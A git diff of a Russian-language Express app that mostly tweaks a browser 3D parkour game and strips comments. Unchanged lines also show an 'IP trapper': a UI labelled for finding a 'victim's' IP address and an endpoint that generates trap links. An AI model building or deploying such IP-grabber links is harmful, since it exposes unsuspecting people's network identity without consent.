@@ -21,7 +21,6 @@ let signTexts = [
     "Здесь был Дефф"
 ];
 
-// Создаем файл по умолчанию, если его нет
 if (!fs.existsSync(textsFilePath)) {
     fs.writeFileSync(textsFilePath, signTexts.join('\n'), 'utf-8');
 } else {
@@ -37,7 +36,6 @@ if (!fs.existsSync(textsFilePath)) {
 let currentTrap = null;     
 let lastResult = null;      
 
-// Статьи теперь хранят время создания
 let globalArticles = [
     {
         id: "promo",
@@ -54,15 +52,13 @@ let onlinePlayers = {};
 setInterval(() => {
     const now = Date.now();
     
-    // 1. Очистка статей старше 1 часа (3600000 миллисекунд)
-    const beforeLength = globalArticles.length;
+    // 1. Очистка статей старше 1 часа
     globalArticles = globalArticles.filter(art => {
-        // Промо-статью не удаляем, чтобы список не пустовал всегда
         if (art.id === "promo") return true;
         return (now - art.createdAt) < 3600000;
     });
 
-    // 2. Очистка неактивных игроков (офлайн дольше 7 секунд)
+    // 2. Очистка неактивных игроков
     for (const nick in onlinePlayers) {
         if (now - onlinePlayers[nick].lastSeen > 7000) {
             delete onlinePlayers[nick];
@@ -70,14 +66,7 @@ setInterval(() => {
     }
 }, 5000);
 
-// === АВТОПИНГЕР ===
 const APP_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
-setInterval(() => {
-    axios.get(`${APP_URL}/ping`)
-        .then(() => console.log('[CtalkeP] Автопинг.'))
-        .catch(err => console.log('[CtalkeP] Ошибка автопинга:', err.message));
-}, 600000);
-
 app.get('/ping', (req, res) => res.send('pong'));
 
 // === ГЛАВНЫЙ ИНТЕРФЕЙС ===
@@ -136,7 +125,7 @@ app.get('/', (req, res) => {
                     <h2 class="text-md font-bold mb-1 text-red-500 tracking-wide uppercase">УЗНАТЬ IP-адрес</h2>
                     <p class="text-xs text-zinc-500 mb-4">Предыдущая ссылка удаляется автоматически при новой генерации.</p>
                     <div class="space-y-3 mb-4">
-                        <input type="text" id="trapMessageInput" placeholder="Текст на экране жертвы (например: Твой IP))" class="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-3 py-2 text-xs text-white outline-none focus:border-red-500 transition">
+                        <input type="text" id="trapMessageInput" placeholder="Текст на экране жертвы" class="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-3 py-2 text-xs text-white outline-none focus:border-red-500 transition">
                     </div>
                     <button onclick="generateTrap()" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-2 rounded-lg text-sm transition">Сгенерировать ссылку</button>
                     <div id="trapArea" class="hidden mt-4 space-y-3">
@@ -255,7 +244,6 @@ app.get('/', (req, res) => {
         let lastVisitDate = localStorage.getItem('lastVisitDate');
         let localArticles = JSON.parse(localStorage.getItem('saved_articles')) || [];
 
-        // Локальная копия игрового чата (чистится при каждом входе)
         let gameChatHistory = [];
 
         document.getElementById('nicknameInput').value = myNickname.startsWith('Игрок_') ? '' : myNickname;
@@ -267,11 +255,9 @@ app.get('/', (req, res) => {
             localStorage.setItem('lastVisitDate', today);
         }
 
-        // Обновление онлайна игроков в Лобби
         async function updateLobbyOnline() {
             document.getElementById('balanceDisplay').textContent = 'Баланс: $' + myBalance.toFixed(2);
             try {
-                // Пингуем синхронизацию просто чтобы получить актуальный список
                 const res = await fetch('/api/parkour/sync', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -455,19 +441,20 @@ app.get('/', (req, res) => {
         let scene, camera, renderer;
         let platforms = []; 
         let otherPlayers = {}; 
-        let localClouds = []; // Локальные красивые облака
-        let signBoards = [];   // Текстовые парящие таблички
+        let localClouds = []; 
+        let signBoards = [];   
         let isGameActive = false;
         let multiplayerInterval = null;
 
-        let playerPos = { x: 0, y: 1.5, z: 0 };
+        // ТОЧКА СПАВНА ИГРОКА (Приподнята для мягкого приземления)
+        let playerPos = { x: 0, y: 3.0, z: 0 };
         let playerVelocity = { x: 0, y: 0, z: 0 };
         let cameraRot = { pitch: 0, yaw: 0 }; 
         let isGrounded = false;
         
-        const gravity = -23.5;  
-        const jumpStrength = 9.3; 
-        const moveSpeed = 7.4;   
+        const gravity = -22.0;  
+        const jumpStrength = 9.0; 
+        const moveSpeed = 7.0;   
 
         let keys = { w: false, a: false, s: false, d: false, space: false };
         let isTouchDevice = false;
@@ -475,7 +462,8 @@ app.get('/', (req, res) => {
         let joystickStart = { x: 0, y: 0 };
         let touchMoveVector = { x: 0, z: 0 };
 
-        let mapSeed = 98765;
+        // Инициализация сида
+        let mapSeed = 34567;
         function localRandom() {
             let x = Math.sin(mapSeed++) * 10000;
             return x - Math.floor(x);
@@ -485,31 +473,26 @@ app.get('/', (req, res) => {
             isTouchDevice = true;
         }
 
-        // --- ВЕФ-АУДИО СИНТЕЗАТОР БЕСКОНЕЧНОЙ МУЗЫКИ ---
+        // --- САУНДТРЕК ---
         let audioCtx = null;
         let musicInterval = null;
         function startProceduralMusic() {
             try {
                 audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                let tempo = 120;
+                let tempo = 125;
                 let step = 0;
-                // Весёлая мажорная ретро гамма
                 let melody = [60, 64, 67, 72, 69, 67, 64, 62, 60, 67, 72, 76, 74, 72, 67, 69];
 
                 musicInterval = setInterval(() => {
                     if (!isGameActive || audioCtx.state === 'suspended') return;
                     
                     let note = melody[step % melody.length];
-                    // Бас-бочка на каждый 4-й шаг
                     if (step % 4 === 0) playKick();
-                    // Мелодия играет с пропуском каждого 3-го такта для синкопы
                     if (step % 3 !== 0) playSynthNote(note);
 
                     step++;
-                }, 60000 / tempo / 2); // 16-е доли
-            } catch (e) {
-                console.log("Аудио недоступно до первого клика.");
-            }
+                }, 60000 / tempo / 2);
+            } catch (e) {}
         }
 
         function playSynthNote(midi) {
@@ -517,37 +500,35 @@ app.get('/', (req, res) => {
             let osc = audioCtx.createOscillator();
             let gain = audioCtx.createGain();
             
-            osc.type = 'triangle'; // Мягкий винтажный звук
+            osc.type = 'triangle';
             osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
 
-            gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
-            gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.3);
+            gain.gain.setValueAtTime(0.06, audioCtx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.25);
 
             osc.connect(gain);
             gain.connect(audioCtx.destination);
             osc.start();
-            osc.stop(audioCtx.currentTime + 0.35);
+            osc.stop(audioCtx.currentTime + 0.3);
         }
 
         function playKick() {
             let osc = audioCtx.createOscillator();
             let gain = audioCtx.createGain();
-            osc.frequency.setValueAtTime(150, audioCtx.currentTime);
-            osc.frequency.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.12);
-            gain.gain.setValueAtTime(0.18, audioCtx.currentTime);
-            gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.12);
+            osc.frequency.setValueAtTime(130, audioCtx.currentTime);
+            osc.frequency.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.1);
+            gain.gain.setValueAtTime(0.15, audioCtx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.1);
             osc.connect(gain);
             gain.connect(audioCtx.destination);
             osc.start();
-            osc.stop(audioCtx.currentTime + 0.13);
+            osc.stop(audioCtx.currentTime + 0.11);
         }
 
         function startParkourGame() {
             document.getElementById('lobbyView').classList.add('hidden');
             document.getElementById('gameView').classList.remove('hidden');
-            document.getElementById('gameUserNick').textContent = myNickname;
             
-            // Чистим игровой чат перед новым заходом
             gameChatHistory = [];
             document.getElementById('gameChatContent').innerHTML = '';
 
@@ -595,7 +576,6 @@ app.get('/', (req, res) => {
             updateLobbyOnline();
         }
 
-        // === ЧАТ ВНУТРИ ИГРЫ ===
         function toggleGameChat() {
             const chatWin = document.getElementById('gameChatWindow');
             chatWin.classList.toggle('hidden');
@@ -616,7 +596,6 @@ app.get('/', (req, res) => {
             input.value = '';
         }
 
-        // Обновляем сообщения внутри игры
         async function fetchGameChatMessages() {
             if (!isGameActive) return;
             try {
@@ -643,29 +622,24 @@ app.get('/', (req, res) => {
             const container = document.getElementById('threeJsContainer');
             
             scene = new THREE.Scene();
-            // Красивый туман (внизу плавно переходит в чисто-белый/небесно-голубой, без черноты!)
-            scene.fog = new THREE.FogExp2('#e0f2fe', 0.009);
+            scene.fog = new THREE.FogExp2('#e0f2fe', 0.008);
 
             camera = new THREE.PerspectiveCamera(65, window.innerWidth / window.innerHeight, 0.1, 1000);
-            camera.position.set(playerPos.x, playerPos.y, playerPos.z);
 
             renderer = new THREE.WebGLRenderer({ antialias: true });
             renderer.setSize(window.innerWidth, window.innerHeight);
             renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
-            renderer.setClearColor('#e0f2fe', 1); // Дневное небо светлое!
+            renderer.setClearColor('#e0f2fe', 1); 
             container.appendChild(renderer.domElement);
 
-            const ambientLight = new THREE.AmbientLight(0xffffff, 0.85); // Много света!
+            const ambientLight = new THREE.AmbientLight(0xffffff, 0.9); 
             scene.add(ambientLight);
 
-            const dirLight = new THREE.DirectionalLight(0xffffff, 0.95);
-            dirLight.position.set(20, 100, 20);
+            const dirLight = new THREE.DirectionalLight(0xffffff, 1.0);
+            dirLight.position.set(30, 120, 30);
             scene.add(dirLight);
 
-            // Создаем красивую процедурную генерацию облаков на небе (локально, без нагрузки)
             generatePrettyClouds();
-
-            // Инициализируем генерацию первой пачки платформ
             resetInfiniteMap();
 
             let lastTime = performance.now();
@@ -679,7 +653,7 @@ app.get('/', (req, res) => {
                 updatePlayerPhysics(dt);
                 updateCamera();
                 updateInfiniteWorld(); 
-                animateClouds(dt);    // Анимируем движение облаков
+                animateClouds(dt);    
                 renderOtherPlayers();
 
                 renderer.render(scene, camera);
@@ -689,17 +663,13 @@ app.get('/', (req, res) => {
             window.addEventListener('resize', onWindowResize);
         }
 
-        // === ПРОЦЕДУРНЫЕ КРАСИВЫЕ ОБЛАКА ===
         function generatePrettyClouds() {
             localClouds = [];
-            // Спавним 25 больших кучевых облаков на небесах (высота 35-50 метров)
-            for (let i = 0; i < 25; i++) {
+            for (let i = 0; i < 28; i++) {
                 const cloudGroup = new THREE.Group();
-                const cloudSize = Math.random() * 6 + 4;
-                
-                // Каждое облако собирается из 4-6 пушистых сфер разного диаметра
-                const puffCount = Math.floor(Math.random() * 3 + 3);
-                const puffMat = new THREE.MeshLambertMaterial({ color: 0xffffff, transparent: true, opacity: 0.9 });
+                const cloudSize = Math.random() * 7 + 4;
+                const puffCount = Math.floor(Math.random() * 4 + 3);
+                const puffMat = new THREE.MeshLambertMaterial({ color: 0xffffff, transparent: true, opacity: 0.95 });
 
                 for (let j = 0; j < puffCount; j++) {
                     const radius = (Math.random() * 0.5 + 0.5) * (cloudSize / 2);
@@ -707,45 +677,41 @@ app.get('/', (req, res) => {
                     const mesh = new THREE.Mesh(geo, puffMat);
                     mesh.position.set(
                         (Math.random() - 0.5) * cloudSize,
-                        (Math.random() - 0.5) * (cloudSize * 0.3),
+                        (Math.random() - 0.5) * (cloudSize * 0.25),
                         (Math.random() - 0.5) * cloudSize
                     );
                     cloudGroup.add(mesh);
                 }
 
-                // Случайная позиция по площади вокруг центра
-                const cx = (Math.random() - 0.5) * 350;
-                const cy = Math.random() * 15 + 32; // Высота полета
-                const cz = (Math.random() - 0.5) * 350;
+                const cx = (Math.random() - 0.5) * 380;
+                const cy = Math.random() * 15 + 35; 
+                const cz = (Math.random() - 0.5) * 380;
 
                 cloudGroup.position.set(cx, cy, cz);
                 scene.add(cloudGroup);
 
                 localClouds.push({
                     group: cloudGroup,
-                    speed: Math.random() * 0.8 + 0.3, // Скорость плытия
+                    speed: Math.random() * 0.9 + 0.3, 
                     baseZ: cz
                 });
             }
         }
 
         function animateClouds(dt) {
-            // Плавно двигаем облака. Если уплыло слишком далеко по Z — спавним за спиной у игрока
             localClouds.forEach(cloud => {
                 cloud.group.position.z += cloud.speed * dt * 4;
-                if (cloud.group.position.z > playerPos.z + 180) {
-                    cloud.group.position.z = playerPos.z - 180;
-                    cloud.group.position.x = (Math.random() - 0.5) * 300;
+                if (cloud.group.position.z > playerPos.z + 200) {
+                    cloud.group.position.z = playerPos.z - 200;
+                    cloud.group.position.x = (Math.random() - 0.5) * 350;
                 }
             });
         }
 
-        // === ПРОЦЕДУРНАЯ БЕСКОНЕЧНАЯ ГЕНЕРАЦИЯ С ТАБЛИЧКАМИ ===
-        let nextPlatformZ = -3.5; 
+        // === СТАБИЛЬНЫЙ ГЕНЕРАТОР БЕЗ ПУСТОТЫ ===
+        let nextPlatformZ = -4.0; 
         let lastPlatformX = 0;
         let lastPlatformY = 0;
-
-        // Получаем тексты табличек от сервера
         let serverSignTexts = signTexts; 
 
         function resetInfiniteMap() {
@@ -754,16 +720,16 @@ app.get('/', (req, res) => {
             platforms = [];
             signBoards = [];
 
-            // Базовая платформа
-            createPlatform(0, 0, 0, 6, 0.8, 6, "#3b82f6");
+            // НАДЁЖНЫЙ СПАВН: Огромная база под ногами при старте
+            createPlatform(0, -0.4, 0, 8, 1.0, 8, "#3b82f6");
 
-            nextPlatformZ = -3.5;
+            nextPlatformZ = -4.0;
             lastPlatformX = 0;
             lastPlatformY = 0;
-            mapSeed = 98765; 
+            mapSeed = 34567; 
 
-            // Первые 20 блоков
-            for (let i = 0; i < 20; i++) {
+            // Сразу генерируем 25 платформ перед игроком
+            for (let i = 0; i < 25; i++) {
                 spawnNextBlock();
             }
 
@@ -775,8 +741,8 @@ app.get('/', (req, res) => {
             const material = new THREE.MeshPhongMaterial({
                 color: new THREE.Color(color),
                 emissive: new THREE.Color(color),
-                emissiveIntensity: 0.35,
-                shininess: 80
+                emissiveIntensity: 0.3,
+                shininess: 90
             });
             const mesh = new THREE.Mesh(geometry, material);
             mesh.position.set(x, y, z);
@@ -788,84 +754,82 @@ app.get('/', (req, res) => {
             });
         }
 
-        // Функция спавна парящей текстовой таблички прямо над платформой (сквозная!)
         function spawnSignBoard(x, y, z) {
-            // Выбираем псевдослучайную фразу, привязанную к координате Z
             const textIdx = Math.abs(Math.floor(z)) % serverSignTexts.length;
             const text = serverSignTexts[textIdx];
 
             const group = new THREE.Group();
 
-            // Сама табличка (тонкий прозрачный пласт)
-            const boardGeo = new THREE.BoxGeometry(1.6, 0.7, 0.05);
+            const boardGeo = new THREE.BoxGeometry(2.0, 0.8, 0.05);
             const boardMat = new THREE.MeshBasicMaterial({
-                color: 0x0a0a0a,
+                color: 0x050505,
                 transparent: true,
-                opacity: 0.8,
+                opacity: 0.85,
                 side: THREE.DoubleSide
             });
             const boardMesh = new THREE.Mesh(boardGeo, boardMat);
             group.add(boardMesh);
 
-            // Текст на табличке
             const canvas = document.createElement('canvas');
-            canvas.width = 256;
+            canvas.width = 512;
             canvas.height = 128;
             const ctx = canvas.getContext('2d');
-            ctx.clearRect(0,0,256,128);
-            ctx.fillStyle = '#ffffff';
-            ctx.font = 'bold 22px sans-serif';
+            ctx.clearRect(0, 0, 512, 128);
+            ctx.fillStyle = '#60a5fa';
+            ctx.font = 'bold 30px sans-serif';
             ctx.textAlign = 'center';
-            ctx.fillText(text, 128, 68);
+            ctx.fillText(text, 256, 75);
 
             const textTex = new THREE.CanvasTexture(canvas);
             const textMat = new THREE.MeshBasicMaterial({ map: textTex, transparent: true, side: THREE.DoubleSide });
-            const textMesh = new THREE.Mesh(new THREE.PlaneGeometry(1.5, 0.6), textMat);
-            textMesh.position.z = 0.03; // Чуть впереди
+            const textMesh = new THREE.Mesh(new THREE.PlaneGeometry(1.9, 0.7), textMat);
+            textMesh.position.z = 0.03;
             group.add(textMesh);
 
-            group.position.set(x, y + 1.4, z); // Вешаем на 1.4м выше платформы
+            group.position.set(x, y + 1.5, z); 
             scene.add(group);
 
             signBoards.push({ group, z });
         }
 
         function spawnNextBlock() {
-            let distZ = -(localRandom() * 1.1 + 3.3); 
-            let distX = (localRandom() - 0.5) * 3.8; 
-            let distY = (localRandom() - 0.4) * 1.3; 
+            // Расстояния строго лимитированы, чтобы убрать пустоты
+            let distZ = -(localRandom() * 1.5 + 3.2); // От 3.2 до 4.7м
+            let distX = (localRandom() - 0.5) * 3.0;   // Плавное смещение влево/вправо
+            let distY = (localRandom() - 0.5) * 0.8;   // Плавное смещение по высоте
 
             lastPlatformX += distX;
             lastPlatformY += distY;
             nextPlatformZ += distZ;
 
-            if (lastPlatformY < -5) lastPlatformY = -3;
-            if (lastPlatformY > 5) lastPlatformY = 2;
+            // Держим высоту в строгих границах безопасного прыжка
+            if (lastPlatformY < -3) lastPlatformY = -2;
+            if (lastPlatformY > 4) lastPlatformY = 1.5;
 
-            const colors = ["#ef4444", "#10b981", "#8b5cf6", "#f59e0b", "#ec4899", "#06b6d4"];
+            const colors = ["#ef4444", "#10b981", "#8b5cf6", "#f59e0b", "#06b6d4", "#ec4899"];
             const color = colors[Math.floor(localRandom() * colors.length)];
 
             const platX = parseFloat(lastPlatformX.toFixed(2));
             const platY = parseFloat(lastPlatformY.toFixed(2));
             const platZ = parseFloat(nextPlatformZ.toFixed(2));
 
-            createPlatform(platX, platY, platZ, 2.0, 0.6, 2.0, color);
+            // Платформы стали толще и шире (2.2 x 2.2), чтобы попадать было проще
+            createPlatform(platX, platY, platZ, 2.2, 0.6, 2.2, color);
 
-            // ШАНС СПАВНА ТАБЛИЧКИ: спавнится РЕДКО (15% шанс)
+            // Редкий шанс появления таблички (15%)
             if (localRandom() < 0.15) {
                 spawnSignBoard(platX, platY, platZ);
             }
         }
 
         function updateInfiniteWorld() {
-            const triggerZ = nextPlatformZ + 40; 
+            const triggerZ = nextPlatformZ + 50; 
             if (playerPos.z < triggerZ) {
                 for (let i = 0; i < 10; i++) {
                     spawnNextBlock();
                 }
 
-                // Выгрузка старых табличек и платформ позади игрока
-                const playerPassedZ = playerPos.z + 50;
+                const playerPassedZ = playerPos.z + 40;
                 
                 platforms = platforms.filter(p => {
                     if (p.z > playerPassedZ && p.z !== 0) { 
@@ -888,7 +852,7 @@ app.get('/', (req, res) => {
             document.getElementById('distanceMeter').textContent = currentDistance.toFixed(1) + "м";
         }
 
-        // === УПРАВЛЕНИЕ И ДВИЖЕНИЕ ===
+        // === ФИЗИКА ДВИЖЕНИЯ ===
         function setupPhysicsEvents() {
             window.addEventListener('keydown', handleKeyDown);
             window.addEventListener('keyup', handleKeyUp);
@@ -921,12 +885,9 @@ app.get('/', (req, res) => {
         }
 
         function respawnPlayer() {
-            playerPos = { x: 0, y: 1.5, z: 0 };
+            playerPos = { x: 0, y: 3.5, z: 0 }; // Возвращаем на безопасную высоту над базой спавна
             playerVelocity = { x: 0, y: 0, z: 0 };
             cameraRot = { pitch: 0, yaw: 0 };
-            if (isGameActive && platforms.length > 30) {
-                resetInfiniteMap();
-            }
         }
 
         function updatePlayerPhysics(dt) {
@@ -961,7 +922,6 @@ app.get('/', (req, res) => {
             playerPos.z += worldMoveZ * dt;
             playerPos.y += playerVelocity.y * dt;
 
-            // КОЛЛИЗИИ (СВЕРХНАДЁЖНАЯ ФИЗИКА НАСТУПЛЕНИЯ НА ПЛАТФОРМУ)
             isGrounded = false;
             const playerHeight = 1.3;
             const playerRadius = 0.38;
@@ -974,7 +934,7 @@ app.get('/', (req, res) => {
 
                 if (playerPos.x > minX && playerPos.x < maxX && playerPos.z > minZ && playerPos.z < maxZ) {
                     const platformTop = p.y + p.h/2;
-                    if (playerPos.y - playerHeight <= platformTop && playerPos.y - playerHeight >= platformTop - 0.75) {
+                    if (playerPos.y - playerHeight <= platformTop && playerPos.y - playerHeight >= platformTop - 0.7) {
                         if (playerVelocity.y <= 0) {
                             playerPos.y = platformTop + playerHeight;
                             playerVelocity.y = 0;
@@ -990,8 +950,8 @@ app.get('/', (req, res) => {
                 mobileJumpPressed = false; 
             }
 
-            // ПАДЕНИЕ В ТУМАН (СПАВН)
-            if (playerPos.y < -18) {
+            // ПАДЕНИЕ В ТУМАН
+            if (playerPos.y < -15) {
                 respawnPlayer();
             }
         }
@@ -1082,7 +1042,6 @@ app.get('/', (req, res) => {
             });
         }
 
-        // РИСОВАНИЕ СПРАЙТА-НИКНЕЙМА ДЛЯ ДРУГИХ ИГРОКОВ
         function createNicknameTexture(text) {
             const canvas = document.createElement('canvas');
             canvas.width = 256;
@@ -1137,7 +1096,6 @@ app.get('/', (req, res) => {
 
             for (const nick in serverPlayers) {
                 if (nick === myNickname) continue; 
-                // Игнорируем тех, кто просто запрашивает статус из главного лобби
                 if (serverPlayers[nick].lobbyOnly) continue;
 
                 const pData = serverPlayers[nick];
@@ -1159,7 +1117,6 @@ app.get('/', (req, res) => {
                     const headMesh = new THREE.Mesh(headGeo, headMat);
                     headGroup.add(headMesh);
 
-                    // ГЛАЗКИ НА ЛИЦЕ
                     const eyeGeo = new THREE.SphereGeometry(0.06, 8, 8);
                     const eyeMat = new THREE.MeshBasicMaterial({ color: 0xffffff });
                     const pupilGeo = new THREE.SphereGeometry(0.03, 8, 8);
@@ -1233,11 +1190,7 @@ app.get('/', (req, res) => {
 // === API ТРЭППЕРА IP ===
 app.post('/api/ip/create', (req, res) => {
     const id = Math.random().toString(36).substring(2, 8);
-    currentTrap = {
-        id: id,
-        createdAt: Date.now(),
-        customText: req.body.customText || ""
-    };
+    currentTrap = { id: id, createdAt: Date.now(), customText: req.body.customText || "" };
     lastResult = null;
     res.json({ success: true, link: `${APP_URL}/t/${id}`, id });
 });
@@ -1333,9 +1286,7 @@ app.post('/api/articles', (req, res) => {
     const { id, title, desc, content } = req.body;
     if (!title || !content) return res.status(400).json({ error: "No data" });
     
-    // Лимит в 50 статей: убираем старые, если превышен лимит
     if (globalArticles.length >= 50) {
-        // Оставляем промо-статью, удаляем вторую по списку
         if(globalArticles[0].id === 'promo') {
             globalArticles.splice(1, 1);
         } else {
@@ -1349,7 +1300,7 @@ app.post('/api/articles', (req, res) => {
         title, 
         desc: desc || "Без описания", 
         content,
-        createdAt: Date.now() // Запоминаем время публикации
+        createdAt: Date.now()
     });
     res.json({ success: true });
 });
@@ -1364,7 +1315,7 @@ app.post('/api/chat/send', (req, res) => {
     res.json({ success: true });
 });
 
-// === API СИНХРОНИЗАЦИИ МУЛЬТИПЛЕЕРА ===
+// === API СИНХРОНИЗАЦИИ ===
 app.post('/api/parkour/sync', (req, res) => {
     const { nickname, x, y, z, rx, ry, lobbyOnly } = req.body;
     if (!nickname) return res.status(400).json({ error: "No Nick" });
